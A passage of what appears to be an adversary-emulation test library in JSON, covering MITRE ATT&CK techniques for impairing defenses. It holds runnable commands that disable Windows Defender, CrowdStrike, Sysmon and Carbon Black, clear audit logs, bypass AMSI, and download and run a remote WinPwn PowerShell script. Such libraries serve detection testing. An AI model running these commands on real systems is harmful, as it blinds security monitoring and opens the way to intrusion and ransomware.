/category:\"Detailed Tracking\" /success:disable\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3", "clacwm1o900a229mqc29wf91o"], "tags": []}, {"data": {"name": "Disable Windows IIS HTTP Logging", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | website_name | The name of the website on a server | String | Default Web Site | "}, "executionSteps": [{"description": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3", "clacwm1o900a229mqc29wf91o"], "tags": []}, {"data": {"name": "Disable Event Logging with wevtutil", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | log_name | Name of the log to be disabled | String | Microsoft-Windows-IKE/Operational | "}, "executionSteps": [{"description": "wevtutil sl \"#{log_name}\" /e:false\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3"], "tags": []}, {"data": {"name": "Clear Windows Audit Policy Config", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "auditpol /clear /y\nauditpol /remove /allusers\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3", "clacwm1o900a229mqc29wf91o"], "tags": []}, {"data": {"name": "WinPwn - Kill the event log services for stealth", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Kill the event log services for stealth via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Unload Sysmon Filter Driver", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sysmon_driver | The name of the Sysmon filter driver (this can change from the default) | String | SysmonDrv | "}, "executionSteps": [{"description": "fltmc.exe unload #{sysmon_driver}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Uninstall Sysmon", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sysmon_exe | The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH) | Path | PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe | "}, "executionSteps": [{"description": "sysmon -u\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Uninstall Crowdstrike Falcon on Windows", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | falcond_path | The Crowdstrike Windows Sensor path. The Guid always changes. | Path | C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe | "}, "executionSteps": [{"description": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender Registry", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender Evade Scanning -Process", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | excluded_process | A list of processes to exclude from scanning | String | outlook.exe | "}, "executionSteps": [{"description": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender Evade Scanning -Folder", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | excluded_folder | This folder will be excluded from scanning | Path | C:\\Temp | "}, "executionSteps": [{"description": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender Evade Scanning -Extension", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | excluded_exts | A list of extension to exclude from scanning | String | .exe | "}, "executionSteps": [{"description": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender Command Prompt", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Tamper with Windows Defender ATP using Aliases - PowerShell", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Tamper with Windows Defender ATP PowerShell", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Stop Crowdstrike Falcon on Linux", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stop and disable Crowdstrike Falcon on Linux\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Stop and unload Crowdstrike Falcon on macOS", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | falcond_plist | The path of the Crowdstrike Falcon plist file | Path | /Library/LaunchDaemons/com.crowdstrike.falcond.plist | \n | userdaemon_plist | The path of the Crowdstrike Userdaemon plist file | Path | /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist | "}, "executionSteps": [{"description": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Stop and Remove Arbitrary Security Windows Service", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_name | The name of the service to remove | String | McAfeeDLPAgentService | "}, "executionSteps": [{"description": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Remove Windows Defender Definition Files", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "office-365-Disable-AntiPhishRule", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n\n\n**Supported Platforms:** office-365\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | office-365 username | String | null | \n | password | office-365 password | String | null | "}, "executionSteps": [{"description": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 0 -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Kill antimalware protected processes using Backstab", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_name | Name of the protected process you want to kill/terminate. | string | MsMpEng.exe | "}, "executionSteps": [{"description": "& $env:temp\\Backstab64.exe -k -n #{process_name}", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Disable Windows Defender with DISM", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Disable syslog", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables syslog collection\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | package_checker | Package checking command for linux. | String | (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) | \n | package_installer | Package installer command for linux. Default yum | String | (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog) | \n | flavor_command | Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog | String | systemctl stop rsyslog ; systemctl disable rsyslog | \n | cleanup_command | Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on | String | systemctl start rsyslog ; systemctl enable rsyslog | "}, "executionSteps": [{"description": "#{flavor_command}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable SELinux", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables SELinux enforcement\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "setenforce 0\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable OpenDNS Umbrella", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables OpenDNS Umbrella\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable Microsoft Office Security Features", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable macOS Gatekeeper", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables macOS Gatekeeper\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo spctl --master-disable\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable LittleSnitch", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables LittleSnitch\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable Defender with Defender Control", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | DefenderID | Defender ID that is used as a sort of passcode to disable it within Defender Control from the command line. The machine-specific Defender ID can be obtained within Defender Control by going to menu, command line info, and then retrieving the 4 character passcode to continue (listed after defendercontrol /d /id in the command line info window). | String | FFFF | \n | DefenderControlExe | Path to Defender Control software version 1.6. | String | $env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe | "}, "executionSteps": [{"description": "cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Disable Defender Using NirSoft AdvancedRun", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | AdvancedRun_Location | Path of Advanced Run executable | Path | $env:temp\\AdvancedRun.exe | \n | delete_defender_folder | Set to 1 to also delete the Windows Defender folder | Integer | 0 | "}, "executionSteps": [{"description": "Try {cmd /c #{AdvancedRun_Location} /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c #{AdvancedRun_Location} /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er"], "tags": []}, {"data": {"name": "Disable Cb Response", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disable the Cb Response service\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable Carbon Black Response", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables Carbon Black Response\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Disable Arbitrary Security Windows Service", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_name | The name of the service to stop | String | McAfeeDLPAgentService | "}, "executionSteps": [{"description": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "AMSI Bypass - Remove AMSI Provider Reg Key", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", "clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "AMSI Bypass - AMSI InitFailed", "shortName": "T1562.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "successCriteria": null}], "techniqueIds": ["clacwm6hl03hm29mq8mfi43er", 